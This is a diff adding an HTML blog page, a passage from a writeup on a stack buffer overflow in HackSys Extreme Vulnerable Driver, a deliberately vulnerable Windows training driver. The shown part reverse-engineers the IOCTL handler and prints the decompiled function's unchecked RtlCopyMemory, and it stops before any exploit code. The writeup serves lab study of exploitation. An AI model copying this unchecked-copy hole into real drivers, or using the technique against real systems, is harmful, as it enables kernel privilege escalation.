@@ -1,0 +1,1987 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.5.2+insiders-4.23.5">
+    
+    
+      
+        <title>HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass - linxz.tech</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.5014570d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#000000">
+        
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"JetBrains Mono";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="green">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#introduction" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="linxz.tech" class="md-header__button md-logo" aria-label="linxz.tech" data-md-component="logo">
+      
+  <img src="../../../assets/logo.jpg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            linxz.tech
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            <nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+
+
+
+
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  Linxz' Blog
+
+      </a>
+    </li>
+  
+
+      
+        
+
+
+
+
+  
+    <li class="md-tabs__item">
+      <a href="../../../about/" class="md-tabs__link">
+        
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+        
+
+
+
+
+  
+    <li class="md-tabs__item">
+      <a href="../../../tags/" class="md-tabs__link">
+        
+  
+  Tags
+
+      </a>
+    </li>
+  
+
+      
+        
+
+  
+
+
+
+
+  
+    
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../" class="md-tabs__link md-tabs__link--active">
+          
+  
+    
+  
+  Posts
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="linxz.tech" class="md-nav__button md-logo" aria-label="linxz.tech" data-md-component="logo">
+      
+  <img src="../../../assets/logo.jpg" alt="logo">
+
+    </a>
+    linxz.tech
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linxz' Blog
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tags/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tags
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+        
+        
+          <label class="md-nav__link" for="__nav_4">
+            
+  
+  <span class="md-ellipsis">
+    Posts
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" aria-label="Posts" data-md-level="1">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Posts
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Latest Posts
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" type="checkbox" id="__nav_4_2" >
+        
+        
+          <label class="md-nav__link" for="__nav_4_2">
+            
+  
+  <span class="md-ellipsis">
+    2019
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" aria-label="2019" data-md-level="2">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            2019
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2019/2019-08-31-NetSecFocus-AES-Challenge/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NetSecFocus BSides Cymru AES Challenge
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2019/2019-12-8-BAE-ctf-crypto3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    BAE x BSides Chelt CTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" type="checkbox" id="__nav_4_3" >
+        
+        
+          <label class="md-nav__link" for="__nav_4_3">
+            
+  
+  <span class="md-ellipsis">
+    2021
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" aria-label="2021" data-md-level="2">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            2021
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Analysis of a VMWare Guest-to-Host Escape from Pwn2Own 2017
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" type="checkbox" id="__nav_4_4" checked>
+        
+        
+          <label class="md-nav__link" for="__nav_4_4">
+            
+  
+  <span class="md-ellipsis">
+    2022
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" aria-label="2022" data-md-level="2">
+          <label class="md-nav__title" for="__nav_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reversing-the-driver" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reversing the Driver
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reversing the Driver">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#locating-the-irp-handler" class="md-nav__link">
+    <span class="md-ellipsis">
+      Locating the IRP Handler
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#locating-the-ioctl-handler" class="md-nav__link">
+    <span class="md-ellipsis">
+      Locating the IOCTL Handler
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reversing-the-vulnerable-function" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reversing the Vulnerable Function
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dynamic-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dynamic Analysis
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Dynamic Analysis">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#interacting-with-the-driver" class="md-nav__link">
+    <span class="md-ellipsis">
+      Interacting with the Driver
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#verifying-input-and-size" class="md-nav__link">
+    <span class="md-ellipsis">
+      Verifying Input and Size
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gaining-control-of-the-return-address" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gaining Control of the Return Address
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smep-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMEP Bypass
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Exploit
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2022-05-21-HEVD3-DoubleFetch/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HackSys Extreme Vulnerable Driver 3 - Double Fetch
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2022-06-11-HEVD3-MemoryDisclosure/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HackSys Extreme Vulnerable Driver 3 - Memory Disclosure
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reversing-the-driver" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reversing the Driver
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reversing the Driver">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#locating-the-irp-handler" class="md-nav__link">
+    <span class="md-ellipsis">
+      Locating the IRP Handler
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#locating-the-ioctl-handler" class="md-nav__link">
+    <span class="md-ellipsis">
+      Locating the IOCTL Handler
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reversing-the-vulnerable-function" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reversing the Vulnerable Function
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dynamic-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dynamic Analysis
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Dynamic Analysis">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#interacting-with-the-driver" class="md-nav__link">
+    <span class="md-ellipsis">
+      Interacting with the Driver
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#verifying-input-and-size" class="md-nav__link">
+    <span class="md-ellipsis">
+      Verifying Input and Size
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gaining-control-of-the-return-address" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gaining Control of the Return Address
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smep-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMEP Bypass
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Exploit
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+  
+  
+
+
+  <nav class="md-tags" >
+    
+      
+      
+        <a href="../../../tags/#windows-kernel-exploitation" class="md-tag">windows-kernel-exploitation</a>
+      
+    
+  </nav>
+
+
+
+
+<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
+<p>This post is a writeup of a simple Stack Buffer Overflow in HackSys Extreme Vulnerable Driver - we assume that you already have an environment setup to follow along. However, if you don't have an environment setup in this post we use:</p>
+<ul>
+<li>Windows 10 Pro x64 <abbr title="Redstone 1">RS1</abbr></li>
+<li><abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> 3.00</li>
+</ul>
+<p>If you are not sure how to setup a kernel debugging environment you can find plenty of posts of the process online, we will not cover the process in this post.</p>
+<hr>
+
+<h1 id="reversing-the-driver">Reversing the Driver<a class="headerlink" href="#reversing-the-driver" title="Permanent link">&para;</a></h1>
+<p>The first challenge we need to tackle is finding the <abbr title="Input Output Request Packet">IRP</abbr> handler this will take the form of being a function with a huge switch case in it. Since <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> is a relatively small driver it is quite easy to find. In larger drivers this can of course be more tricky but we won't cover that here.</p>
+<h2 id="locating-the-irp-handler">Locating the <abbr title="Input Output Request Packet">IRP</abbr> Handler<a class="headerlink" href="#locating-the-irp-handler" title="Permanent link">&para;</a></h2>
+<p>The <abbr title="Input Output Request Packet">IRP</abbr> handler in HEVDv3 is located at <code>sub_140085078</code> and as stated above the function is quite a large switch case which eventually leads to all of our different <abbr title="Input Output Control">IOCTL</abbr> handlers. The below image shows the graph overview of the <abbr title="Input Output Request Packet">IRP</abbr> handler. We will refer to this handler function as <code>IrpDeviceIoCtlHandler</code> from this point onwards.</p>
+<figure>
+<p><img alt="graph" src="/assets/images/posts/hevd/irpiopctrlhandlergraph.png" />
+  </p>
+<figcaption>IRP Handler Graph</figcaption>
+</figure>
+<p>Now that we've located the <abbr title="Input Output Request Packet">IRP</abbr> handler we can begin reversing.</p>
+<h2 id="locating-the-ioctl-handler">Locating the <abbr title="Input Output Control">IOCTL</abbr> Handler<a class="headerlink" href="#locating-the-ioctl-handler" title="Permanent link">&para;</a></h2>
+<p>In a real world scenario we would have to reverse each of these switched to functions to find a vulnerable one, in this case we know they're all vulnerable and I've already found the routine we are targetting in this blog post from doing a string search of "Buffer overflow". <code>loc_14008522F</code> is the entrypoint to our target function which is shown in the below figure.</p>
+<figure>
+<p><img alt="loc_14008522f" src="/assets/images/posts/hevd/loc_14008522f.png" />
+  </p>
+<figcaption>Entrypoint to target function</figcaption>
+</figure>
+<p>In the above image I've already renamed the <abbr title="Input Output Control">IOCTL</abbr> handler routine as <code>BufferOverflowStackIoctlHandler</code> (or <code>sub_140086594</code> if you're following along) Let's open the function and look at it in some more detail.</p>
+<figure>
+<p><img alt="BufferOverflowIoctlHandler" src="/assets/images/posts/hevd/BufferOverflowStackIoctlHandler.png" />
+  </p>
+<figcaption>IOCTL Handler Function</figcaption>
+</figure>
+<p>The target function is quite small because it calls into the vulnerable function, labelled as <code>TriggerBufferOverflowStack</code> in the above image (or <code>sub_1400865B4</code> if you're following along).</p>
+<h2 id="reversing-the-vulnerable-function">Reversing the Vulnerable Function<a class="headerlink" href="#reversing-the-vulnerable-function" title="Permanent link">&para;</a></h2>
+<p>Finally we've arrived in the vulnerable function and we can begin looking for the vulnerability. The below code block is the decompilation of the vulnerable function. <em>Its been cleaned up for readability</em>.</p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Vulnerable Function</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span>
+<span class="normal"><a href="#__codelineno-0-11">11</a></span>
+<span class="normal"><a href="#__codelineno-0-12">12</a></span>
+<span class="normal"><a href="#__codelineno-0-13">13</a></span>
+<span class="normal"><a href="#__codelineno-0-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="n">TriggerBufferOverflowStack</span><span class="p">(</span><span class="k">volatile</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">Address</span><span class="p">,</span><span class="w"> </span><span class="n">SIZE_T</span><span class="w"> </span><span class="n">a2</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">Dst</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span><span class="w"> </span><span class="c1">// (2)</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4"></a>
+<a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">Dst</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">Dst</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="w">  </span><span class="n">ProbeForRead</span><span class="p">(</span><span class="n">Address</span><span class="p">,</span><span class="w"> </span><span class="mh">0x800</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="w">  </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] UserBuffer: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Address</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="w">  </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] UserBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">a2</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="w">  </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] KernelBuffer: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">Dst</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="w">  </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] KernelBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">2048</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="w">  </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] Triggering Buffer Overflow in Stack</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-0-12" name="__codelineno-0-12"></a><span class="w">  </span><span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">Dst</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Address</span><span class="p">,</span><span class="w"> </span><span class="n">a2</span><span class="p">);</span><span class="w"> </span><span class="c1">// (1)</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-0-14" name="__codelineno-0-14"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div></td></tr></table></div>
+<ol>
+<li>There is no size check on the value of <code>a2</code> and since this value is controlled by us we can specify a size greater than 2048.</li>
+<li>This is a statically allocated buffer of 2048 bytes in kernel mode. The size here is important.</li>
+</ol>
+<p>The function itself is extremely simple, we have a stack allocated buffer <code>Dst</code> which is of size 2048 bytes. Then a <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-probeforread"><code>ProbeForRead</code></a> is performed, this function checks that a user-mode buffer is present in the given address. So far so good.</p>
+<p>Moving down the function we can see an <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory"><code>RtlCopyMemory</code></a> call the bright-eyed among you might notice the issue here straight away. If you're unfamilar <code>RtlCopyMemory</code> does exactly what you imagine, it copies a buffer from a source block to a destination block. </p>
